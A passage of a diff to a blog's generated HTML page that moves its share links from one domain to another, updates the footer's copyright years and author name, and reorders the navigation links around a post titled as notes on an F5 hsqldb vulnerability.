-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&is_video=false&description=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=F5 hsqldb漏洞踩坑笔记&body=Check out this article: http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&name=F5 hsqldb漏洞踩坑笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&t=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&text=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&is_video=false&description=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=F5 hsqldb漏洞踩坑笔记&body=Check out this article: http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&name=F5 hsqldb漏洞踩坑笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&t=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -261,8 +261,8 @@
     Copyright &copy;
     
     
-    2020-2021
-    夏殇
+    2020-2022
+    长夏
   </div>
   <div class="footer-right">
     <nav>
@@ -270,11 +270,11 @@
          
           <li><a href="/">首页</a></li>
          
-          <li><a href="/about/">关于</a></li>
-         
           <li><a href="/archives/">归档</a></li>
          
           <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/about/">关于</a></li>
         
       </ul>
     </nav>
